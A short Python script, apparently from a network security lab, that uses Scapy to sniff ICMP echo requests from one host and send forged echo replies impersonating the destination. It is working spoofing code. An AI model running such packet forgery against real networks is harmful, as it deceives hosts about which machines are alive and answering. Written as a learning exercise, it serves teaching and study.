#!usr/bin/python3
from scapy.all import *

def spoof_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        print('--------Original Packet--------')
        print('\t|-Source IP: ', pkt[IP].src)
        print('\t|-Destination IP: ', pkt[IP].dst)
        
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load
        newpkt = ip/icmp/data
        
        print('--------Spoofed Packet--------')
        print('\t|-Source IP: ', newpkt[IP].src)
        print('\t|-Destination IP: ', newpkt[IP].dst)
        send(newpkt, verbose=0)

pkt = sniff(filter='icmp and src host 10.0.2.4', prn=spoof_pkt)
